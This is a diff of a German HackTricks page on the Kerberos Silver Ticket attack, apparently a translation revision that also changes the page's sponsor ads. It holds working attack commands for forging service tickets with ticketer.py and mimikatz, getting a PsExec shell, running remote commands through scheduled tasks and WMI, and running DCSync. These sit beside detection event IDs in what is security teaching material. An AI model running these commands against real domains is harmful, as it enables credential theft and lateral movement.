@@ -2,31 +2,31 @@
 
 <details>
 
-<summary>Lernen Sie das Hacken von AWS von Grund auf mit <a href="https://training.hacktricks.xyz/courses/arte">htARTE (HackTricks AWS Red Team Expert)</a>!</summary>
+<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Andere Möglichkeiten, HackTricks zu unterstützen:
 
-- Wenn Sie Ihr Unternehmen in HackTricks bewerben möchten oder HackTricks als PDF herunterladen möchten, überprüfen Sie die [ABONNEMENTPLÄNE](https://github.com/sponsors/carlospolop)!
-- Holen Sie sich das offizielle PEASS & HackTricks-Merchandise
-- Entdecken Sie die PEASS-Familie, unsere Sammlung exklusiver NFTs
-- Treten Sie der Discord-Gruppe oder der Telegram-Gruppe bei oder folgen Sie uns auf Twitter
-- Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die HackTricks- und HackTricks Cloud-GitHub-Repositories senden
+* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
+* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
+* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
 
 </details>
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-Wenn Sie an einer Karriere im Hacking interessiert sind und das Unhackbare hacken möchten - **wir stellen ein!** (fließendes Polnisch in Wort und Schrift erforderlich).
+**Bug-Bounty-Tipp**: **Melden Sie sich an** bei **Intigriti**, einer Premium-**Bug-Bounty-Plattform, die von Hackern für Hacker erstellt wurde**! Treten Sie noch heute bei [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) bei und beginnen Sie, Prämien von bis zu **100.000 $** zu verdienen!
 
-{% embed url="https://www.stmcyber.com/careers" %}
+{% embed url="https://go.intigriti.com/hacktricks" %}
 
 ## Silberticket
 
-Der Angriff mit dem **Silberticket** beinhaltet die Ausnutzung von Diensttickets in Active Directory (AD)-Umgebungen. Diese Methode basiert auf dem **Erlangen des NTLM-Hashes eines Dienstkontos**, wie z.B. eines Computerkontos, um ein Ticket Granting Service (TGS)-Ticket zu fälschen. Mit diesem gefälschten Ticket kann ein Angreifer auf bestimmte Dienste im Netzwerk zugreifen und sich als beliebiger Benutzer ausgeben, wobei in der Regel administrative Privilegien angestrebt werden. Es wird betont, dass die Verwendung von AES-Schlüsseln zur Fälschung von Tickets sicherer und weniger erkennbar ist.
+Der **Silberticket**-Angriff beinhaltet die Ausnutzung von Diensttickets in Active Directory (AD)-Umgebungen. Diese Methode basiert auf dem **Erwerb des NTLM-Hashs eines Dienstkontos**, wie z. B. eines Computerkontos, um ein Ticket Granting Service (TGS)-Ticket zu fälschen. Mit diesem gefälschten Ticket kann ein Angreifer auf spezifische Dienste im Netzwerk zugreifen, **wobei er sich als beliebiger Benutzer ausgibt**, wobei er in der Regel auf administrative Berechtigungen abzielt. Es wird betont, dass die Verwendung von AES-Schlüsseln für das Fälschen von Tickets sicherer und weniger erkennbar ist.
 
-Für das Erstellen von Tickets werden verschiedene Tools verwendet, abhängig vom Betriebssystem:
+Für das Ticket-Handling werden verschiedene Tools je nach Betriebssystem verwendet:
 
-### Unter Linux
+### Auf Linux
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
@@ -44,49 +44,41 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-Der CIFS-Dienst wird als häufiges Ziel für den Zugriff auf das Dateisystem des Opfers hervorgehoben, aber auch andere Dienste wie HOST und RPCSS können für Aufgaben und WMI-Abfragen ausgenutzt werden.
-
 ## Verfügbare Dienste
 
-| Diensttyp                                 | Dienst-Silbertickets                                                     |
-| ----------------------------------------- | -------------------------------------------------------------------------- |
-| WMI                                       | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell-Remoting                       | <p>HOST</p><p>HTTP</p><p>Je nach Betriebssystem auch:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                     | <p>HOST</p><p>HTTP</p><p>In einigen Fällen können Sie einfach nach WINRM fragen:</p> |
-| Geplante Aufgaben                         | HOST                                                                       |
-| Windows-Dateifreigabe, auch psexec        | CIFS                                                                       |
-| LDAP-Operationen, einschließlich DCSync   | LDAP                                                                       |
+| Diensttyp                                  | Dienst Silber Tickets                                                     |
+| ------------------------------------------ | -------------------------------------------------------------------------- |
+| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
+| PowerShell-Remoting                        | <p>HOST</p><p>HTTP</p><p>Je nach Betriebssystem auch:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In einigen Fällen können Sie einfach nach: WINRM fragen</p> |
+| Geplante Aufgaben                          | HOST                                                                       |
+| Windows-Dateifreigabe, auch psexec         | CIFS                                                                       |
+| LDAP-Operationen, einschließlich DCSync    | LDAP                                                                       |
 | Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
-| Goldene Tickets                           | krbtgt                                                                     |
+| Goldene Tickets                            | krbtgt                                                                     |
 
-Mit **Rubeus** können Sie alle diese Tickets mit dem Parameter anfordern:
+Mit **Rubeus** können Sie **alle** diese Tickets mit dem Parameter anfordern:
 
 * `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Ereignis-IDs für Silbertickets
+### Silver-Ticket-Ereignis-IDs
 
-* 4624: Kontoanmeldung
+* 4624: Kontoeinwahl
 * 4634: Kontoabmeldung
-* 4672: Administratoranmeldung
+* 4672: Admin-Einwahl
 
-## Missbrauch von Diensttickets
+## Missbrauch von Servicetickets
 
-In den folgenden Beispielen nehmen wir an, dass das Ticket unter Verwendung des Administrator-Kontos abgerufen wird.
+In den folgenden Beispielen nehmen wir an, dass das Ticket unter der Identität des Administrator-Accounts abgerufen wurde.
 
 ### CIFS
 
-Mit diesem Ticket können Sie über **SMB** auf den Ordner `C$` und `ADMIN$` zugreifen (sofern sie freigegeben sind) und Dateien auf einen Teil des Remote-Dateisystems kopieren, indem Sie einfach Folgendes tun:
+Mit diesem Ticket können Sie auf die Ordner `C$` und `ADMIN$` über **SMB** zugreifen (sofern sie freigegeben sind) und Dateien auf einem Teil des entfernten Dateisystems kopieren, indem Sie einfach etwas wie:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-Sie können auch eine Shell im Host erhalten oder beliebige Befehle mit **psexec** ausführen:
-
-{% content-ref url="../ntlm/psexec-and-winexec.md" %}
-[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
-{% endcontent-ref %}
-
 ### HOST
 
 Mit dieser Berechtigung können Sie geplante Aufgaben in entfernten Computern erstellen und beliebige Befehle ausführen:
@@ -113,15 +105,9 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-Finde **weitere Informationen zu wmiexec** auf der folgenden Seite:
-
-{% content-ref url="../ntlm/wmicexec.md" %}
-[wmicexec.md](../ntlm/wmicexec.md)
-{% endcontent-ref %}
-
 ### HOST + WSMAN (WINRM)
 
-Mit WinRM-Zugriff auf einen Computer kannst du **darauf zugreifen** und sogar eine PowerShell erhalten:
+Mit WinRM-Zugriff auf einen Computer können Sie **darauf zugreifen** und sogar eine PowerShell erhalten:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
@@ -132,7 +118,7 @@ New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 {% endcontent-ref %}
 
 {% hint style="warning" %}
-Beachten Sie, dass **WinRM aktiv und im Hörmodus** auf dem Remote-Computer sein muss, um darauf zugreifen zu können.
+Beachten Sie, dass **WinRM aktiv und auf dem Remote-Computer hörend** sein muss, um darauf zuzugreifen.
 {% endhint %}
 
 ### LDAP
@@ -144,6 +130,7 @@ mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.loc
 **Erfahren Sie mehr über DCSync** auf der folgenden Seite:
 
 ## Referenzen
+
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 * [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 
@@ -151,11 +138,11 @@ mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.loc
 [dcsync.md](dcsync.md)
 {% endcontent-ref %}
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-Wenn Sie an einer **Hackerkarriere** interessiert sind und das Unhackbare hacken möchten - **wir stellen ein!** (_fließendes Polnisch in Wort und Schrift erforderlich_).
+**Bug-Bounty-Tipp**: **Melden Sie sich an** bei **Intigriti**, einer Premium-**Bug-Bounty-Plattform, die von Hackern für Hacker erstellt wurde**! Treten Sie uns noch heute bei [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) und beginnen Sie, Prämien von bis zu **$100.000** zu verdienen!
 
-{% embed url="https://www.stmcyber.com/careers" %}
+{% embed url="https://go.intigriti.com/hacktricks" %}
 
 <details>
 
@@ -163,10 +150,10 @@ Wenn Sie an einer **Hackerkarriere** interessiert sind und das Unhackbare hacken
 
 Andere Möglichkeiten, HackTricks zu unterstützen:
 
-* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
+* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.
 
 </details>
